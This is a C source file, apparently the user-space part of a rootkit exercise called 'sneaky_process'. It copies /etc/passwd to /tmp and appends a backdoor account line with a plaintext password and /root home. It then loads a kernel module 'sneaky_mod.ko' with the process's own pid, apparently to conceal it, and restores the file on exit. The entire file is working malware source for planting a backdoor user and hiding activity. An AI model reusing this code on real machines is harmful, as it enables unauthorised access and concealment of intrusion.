#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

//copy file
int copyFile() {
  //open files
  FILE * etcFile = fopen("/etc/passwd", "r");  //read
  FILE * tmpFile = fopen("/tmp/passwd", "w");  //write into a new file
  if (etcFile == NULL) {
    printf("Cannot open /etc/passwd\n");
    return EXIT_FAILURE;
  }
  if (tmpFile == NULL) {
    printf("Cannot open /tmp/passwd\n");
    return EXIT_FAILURE;
  }

  //read buffer and write
  char c = fgetc(etcFile);
  while (c != EOF) {
    fputc(c, tmpFile);
    c = fgetc(etcFile);
  }

  //close files
  if (fclose(tmpFile) != 0) {
    printf("Cannot close /tmp/passwd\n");
    return EXIT_FAILURE;
  }
  if (fclose(etcFile) != 0) {
    printf("Cannot close /etc/passwd\n");
    return EXIT_FAILURE;
  }

  return EXIT_SUCCESS;
}

//add a new line to the end of the file that contains a username and password
int addLine() {
  //open /etc/passwd
  FILE * etcFile = fopen("/etc/passwd", "a");  //"a" mode write from end of file
  if (etcFile == NULL) {
    perror("cannot open the file\n");
    return EXIT_FAILURE;
  }

  //add the line containing '\n'
  fprintf(etcFile, "%s", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");

  //close /etc/passwd
  if (fclose(etcFile) != 0) {
    perror("Cannot close /etc/passwd\n");
    return EXIT_FAILURE;
  }
  return EXIT_SUCCESS;
}

//restore /etc/passwd
int restore() {
  //open files
  FILE * tmpFile = fopen("/tmp/passwd", "r");
  FILE * etcFile = fopen("/etc/passwd", "w");
  if (etcFile == NULL) {
    perror("Cannot open /etc/passwd\n");
    EXIT_FAILURE;
  }
  if (tmpFile == NULL) {
    perror("Cannot open /tmp/passwd\n");
    EXIT_FAILURE;
  }

  //read buffer and write
  char c = fgetc(tmpFile);
  while (c != EOF) {
    fputc(c, etcFile);
    c = fgetc(tmpFile);
  }

  //close files
  if (fclose(etcFile) != 0) {
    perror("cannot close /etc/passwd\n");
    return EXIT_FAILURE;
  }
  if (fclose(tmpFile) != 0) {
    perror("cannot close /tmp/passwd\n");
    return EXIT_FAILURE;
  }
  return EXIT_SUCCESS;
}

int main() {
  printf("sneaky_process pid = %d\n", getpid());
  //copy
  if (copyFile() == -1) {
    perror("cannot copy /etc/passwd\n");
    return EXIT_FAILURE;
  }

  //add new username and password
  if (addLine() == -1) {
    perror("cannot add new username and password\n");
    return EXIT_FAILURE;
  }

  //load the module
  char arg[50];
  sprintf(arg, "insmod sneaky_mod.ko sneaky_pid=%d", (int)getpid());
  system(arg);
  //wait keyboard for q to quit
  char c;
  while ((c = getchar()) != 'q') {
  }

  //unload the module
  system("rmmod sneaky_mod.ko");

  //restore the file
  if (restore() == -1) {
    perror("Cannot resotre the /etc/passwd\n");
    return EXIT_FAILURE;
  }

  system("rm /tmp/passwd");
  return EXIT_SUCCESS;
}
